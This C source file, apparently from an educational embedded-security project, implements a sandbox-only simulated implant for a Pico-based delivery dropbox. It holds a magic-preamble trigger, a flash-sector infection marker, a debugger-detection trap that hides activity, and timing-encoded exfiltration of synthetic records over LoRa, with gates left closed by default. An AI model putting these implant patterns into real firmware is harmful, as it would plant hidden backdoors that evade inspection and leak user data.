// MIT License
//
// Copyright (c) 2026 Kevin Thomas
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
//
// Author:  Kevin Thomas
// Email:   kevin@mytechnotalent.com
// GitHub:  https://github.com/mytechnotalent/smart-logistics-dropbox
// File:    implant.c
// Desc:    Implements the SANDBOX_ONLY FROSTLINE covert channel: synthetic
//          delivery harvest, the ICV1 magic preamble and timing side
//          channel, the reserved-sector staging marker, and the CoreDebug
//          anti-debug trap. Compiled only under SANDBOX_ONLY.
// Created: 2026

#include "implant.h"
#include "dropbox.h"
#include "radio.h"
#include "pico/time.h"
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <string.h>

#ifdef SANDBOX_ONLY

#ifdef IMPLANT_HOST_MOCK
#include "implant_host.h"
/**
 * @brief Read the controllable mock CoreDebug DHCSR register.
 */
#define IMPLANT_DHCSR_READ (g_mock_implant_dhcsr)
/**
 * @brief Read the mock reserved-sector staging marker.
 */
#define IMPLANT_FLASH_READ() (g_mock_implant_flash)
/**
 * @brief Store the staging marker in the mock reserved sector.
 */
#define IMPLANT_FLASH_WRITE(value) (g_mock_implant_flash = (value))
#else
#include "hardware/flash.h"
#include "hardware/sync.h"
/**
 * @brief Read the real CoreDebug DHCSR register.
 */
#define IMPLANT_DHCSR_READ (*(volatile uint32_t *)DROPBOX_IMPLANT_DHCSR_ADDR)
/**
 * @brief Read the real reserved-sector staging marker.
 */
#define IMPLANT_FLASH_READ() (*(volatile uint8_t *)DROPBOX_IMPLANT_RESERVE_ADDR)
/**
 * @brief Erase and program the reserved-sector staging marker.
 *
 * @param value Marker byte to store in the reserved sector.
 * @return void
 */
static void implant_flash_write(uint8_t value) {
    uint8_t page[FLASH_PAGE_SIZE];
    uint32_t ints = save_and_disable_interrupts();
    memset(page, 0xFF, sizeof(page));
    page[0] = value;
    flash_range_erase(DROPBOX_IMPLANT_RESERVE_OFFSET, FLASH_SECTOR_SIZE);
    flash_range_program(DROPBOX_IMPLANT_RESERVE_OFFSET, page, FLASH_PAGE_SIZE);
    restore_interrupts(ints);
}
/**
 * @brief Write the staging marker into the reserved flash sector.
 */
#define IMPLANT_FLASH_WRITE(value) implant_flash_write(value)
#endif

/**
 * @brief Monotonic implant tick counter.
 */
static uint32_t g_implant_ticks;

/**
 * @brief True when the covert-channel payload handler has been armed.
 */
static bool g_implant_armed;

/**
 * @brief True when synthetic delivery records are being harvested.
 */
static bool g_implant_harvest;

/**
 * @brief True when the covert exfiltration channel may emit frames.
 */
static bool g_implant_channel;

/**
 * @brief Runtime gate for the covert exfiltration encoder.
 *
 * The corrected build leaves this gate clear, so the ICV1 preamble and the
 * staged payload are never emitted.
 */
static volatile bool g_implant_channel_gate;

/**
 * @brief Runtime gate for synthetic delivery harvesting.
 *
 * The corrected build leaves this gate clear, so no synthetic record is
 * staged into the ring buffer.
 */
static volatile bool g_implant_harvest_gate;

/**
 * @brief Runtime gate for the reserved-sector staging marker write.
 *
 * The corrected build leaves this gate clear, so no marker is programmed.
 */
static volatile bool g_implant_marker_gate;

/**
 * @brief Number of staged synthetic delivery records.
 */
static size_t g_implant_stage_count;

/**
 * @brief Staging buffer of synthetic delivery records.
 */
static uint8_t g_implant_stage[DROPBOX_IMPLANT_STAGE_LEN];

/**
 * @brief Write one 32-bit value in little-endian order.
 *
 * @param out Pointer to the four-byte output.
 * @param value Value to serialize.
 * @return void
 */
static void implant_put_le32(uint8_t *out, uint32_t value) {
    out[0] = (uint8_t)(value & 0xFFu);
    out[1] = (uint8_t)((value >> 8u) & 0xFFu);
    out[2] = (uint8_t)((value >> 16u) & 0xFFu);
    out[3] = (uint8_t)((value >> 24u) & 0xFFu);
}

bool implant_debug_attached(void) {
    return (IMPLANT_DHCSR_READ &
            (DROPBOX_IMPLANT_DHCSR_DEBUGEN | DROPBOX_IMPLANT_DHCSR_HALT)) != 0u;
}

bool implant_armed(void) {
    return g_implant_armed;
}

bool implant_harvesting(void) {
    return g_implant_armed && g_implant_harvest && !implant_debug_attached();
}

bool implant_channel_active(void) {
    return g_implant_armed && g_implant_channel && !implant_debug_attached();
}

bool implant_infected(void) {
    return IMPLANT_FLASH_READ() == (uint32_t)DROPBOX_IMPLANT_MARKER_BYTE;
}

void implant_set_channel(bool enabled) {
    g_implant_channel = enabled;
}

void implant_set_harvesting(bool enabled) {
    g_implant_harvest = enabled;
}

/**
 * @brief Clear every implant action gate to its corrected state.
 *
 * The corrected build starts with each gate clear, so the covert channel
 * stays inert until a defect is introduced into the image.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_reset_gates(void) {
    g_implant_channel_gate = false;
    g_implant_harvest_gate = false;
    g_implant_marker_gate = false;
}

/**
 * @brief Write the staging marker into the reserved flash sector.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_infect(void) {
    if (!g_implant_marker_gate) {
        return;
    }
    if (implant_infected()) {
        return;
    }
    IMPLANT_FLASH_WRITE((uint32_t)DROPBOX_IMPLANT_MARKER_BYTE);
}

/**
 * @brief Commit one synthetic delivery record into the staging buffer.
 *
 * @param package_id Synthetic package identifier to stage.
 * @param attempts Synthetic pickup attempt count to stage.
 * @return void
 */
static void implant_stage_commit(uint16_t package_id, uint8_t attempts) {
    size_t slot = g_implant_stage_count % DROPBOX_IMPLANT_STAGE_SLOTS;
    uint8_t *rec = &g_implant_stage[slot * DROPBOX_IMPLANT_RECORD_LEN];
    rec[0] = (uint8_t)(package_id & 0xFFu);
    rec[1] = (uint8_t)((package_id >> 8u) & 0xFFu);
    rec[2] = attempts;
    implant_put_le32(&rec[3], g_implant_ticks);
    if (g_implant_stage_count < DROPBOX_IMPLANT_STAGE_SLOTS) {
        g_implant_stage_count += 1u;
    }
}

/**
 * @brief Append one synthetic delivery record when the harvest gate is open.
 *
 * @param package_id Synthetic package identifier to stage.
 * @param attempts Synthetic pickup attempt count to stage.
 * @return void
 */
static void implant_stage_write(uint16_t package_id, uint8_t attempts) {
    if (!g_implant_harvest_gate) {
        return;
    }
    implant_stage_commit(package_id, attempts);
}

/**
 * @brief Harvest a synthetic delivery record from an inbound frame.
 *
 * @param frame Pointer to the matched covert-channel frame bytes.
 * @param len Number of inbound frame bytes.
 * @return void
 */
static void implant_harvest(const uint8_t *frame, size_t len) {
    uint16_t package_id = 0u;
    uint8_t attempts = 0u;
    if (len > DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN) {
        package_id = (uint16_t)(frame[4] | ((uint16_t)frame[5] << 8u));
    }
    if (len > (DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN + 2u)) {
        attempts = frame[6];
    }
    implant_stage_write(package_id, attempts);
}

/**
 * @brief Report whether a frame carries the ICV1 channel magic.
 *
 * @param frame Pointer to the inbound frame bytes.
 * @param len Number of inbound frame bytes.
 * @return bool true when the frame begins with the channel magic.
 */
static bool implant_channel_match(const uint8_t *frame, size_t len) {
    if (frame == NULL || len < DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN) {
        return false;
    }
    return memcmp(frame, DROPBOX_IMPLANT_CHANNEL_MAGIC,
                  DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN) == 0;
}

/**
 * @brief Copy the staged records into one covert-channel frame body.
 *
 * @param frame Pointer to the output frame buffer.
 * @param offset Byte offset where the staged records are placed.
 * @return void
 */
static void implant_copy_stage(uint8_t *frame, size_t offset) {
    size_t i;
    size_t bytes = (size_t)g_implant_stage_count * DROPBOX_IMPLANT_RECORD_LEN;
    for (i = 0u; i < bytes; ++i) {
        frame[offset + i] = g_implant_stage[i];
    }
}

/**
 * @brief Build one covert-channel frame from the magic and staged records.
 *
 * @param frame Pointer to the DROPBOX_IMPLANT_FRAME_MAX output buffer.
 * @return size_t Length in bytes of the built frame.
 */
static size_t implant_build_channel(uint8_t *frame) {
    size_t total = DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN;
    size_t bytes = (size_t)g_implant_stage_count * DROPBOX_IMPLANT_RECORD_LEN;
    memcpy(frame, DROPBOX_IMPLANT_CHANNEL_MAGIC,
           DROPBOX_IMPLANT_CHANNEL_MAGIC_LEN);
    frame[total] = (uint8_t)g_implant_stage_count;
    total += 1u;
    implant_copy_stage(frame, total);
    return total + bytes;
}

/**
 * @brief Spend the covert timing side channel for one frame.
 *
 * @param frame Pointer to the built covert-channel frame bytes.
 * @param len Number of frame bytes to time.
 * @return void
 */
static void implant_emit_timing(const uint8_t *frame, size_t len) {
    size_t i;
    for (i = 0u; i < len; ++i) {
        sleep_us((uint64_t)frame[i] * DROPBOX_IMPLANT_CHANNEL_BIT_US);
    }
}

/**
 * @brief Emit one timing-encoded covert-channel frame over LoRa.
 *
 * @param void No parameters.
 * @return void
 */
static void implant_send_channel(void) {
    uint8_t frame[DROPBOX_IMPLANT_FRAME_MAX];
    if (!g_implant_channel_gate) {
        return;
    }
    size_t len = implant_build_channel(frame);
    implant_emit_timing(frame, len);
    radio_send_frame(DROPBOX_UART, frame, len);
}

void implant_tick(void) {
    g_implant_ticks += 1u;
    if (!implant_channel_active()) {
        return;
    }
    if ((g_implant_ticks % DROPBOX_IMPLANT_TICK_INTERVAL) != 0u) {
        return;
    }
    if (implant_harvesting()) {
        implant_stage_write((uint16_t)(0x1000u + g_implant_ticks), 0u);
    }
    implant_send_channel();
}

void implant_handle_command(const uint8_t *frame, size_t len) {
    if (!implant_channel_match(frame, len) || implant_debug_attached()) {
        return;
    }
    g_implant_armed = true;
    implant_infect();
    if (!implant_harvesting()) {
        return;
    }
    implant_harvest(frame, len);
    implant_send_channel();
}

void implant_init(void) {
    implant_reset_gates();
    g_implant_ticks = 0u;
    g_implant_armed = false;
    g_implant_harvest = true;
    g_implant_channel = true;
    g_implant_stage_count = 0u;
    g_implant_armed = implant_infected();
    implant_infect();
}

void implant_stage_clear(void) {
    memset(g_implant_stage, 0, sizeof(g_implant_stage));
    g_implant_stage_count = 0u;
}

size_t implant_stage_count(void) {
    return g_implant_stage_count;
}

size_t implant_stage_read(uint8_t *out, size_t out_len) {
    size_t bytes = (size_t)g_implant_stage_count * DROPBOX_IMPLANT_RECORD_LEN;
    if (out == NULL || out_len < bytes) {
        return 0u;
    }
    memcpy(out, g_implant_stage, bytes);
    return bytes;
}

void implant_neutralize(void) {
    g_implant_channel = false;
    g_implant_harvest = false;
    implant_stage_clear();
    IMPLANT_FLASH_WRITE(0u);
}

#endif // SANDBOX_ONLY
